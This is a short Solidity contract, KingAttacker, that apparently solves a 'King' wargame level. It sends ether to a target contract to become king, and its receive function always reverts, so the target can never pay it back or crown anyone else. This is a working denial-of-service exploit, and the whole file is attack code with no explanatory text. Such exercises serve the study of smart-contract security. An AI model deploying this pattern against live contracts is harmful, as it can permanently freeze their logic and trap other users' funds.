// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    error KingAttacker__AttackNotSuccessful();

    address private king;

    constructor(address _kingAddress) {
        king = _kingAddress;
    }

    receive() external payable {
        revert();
    }

    function attack() external payable {
        (bool success, ) = payable(king).call{value: msg.value}("");
        if (!success) {
            revert KingAttacker__AttackNotSuccessful();
        }
    }
}
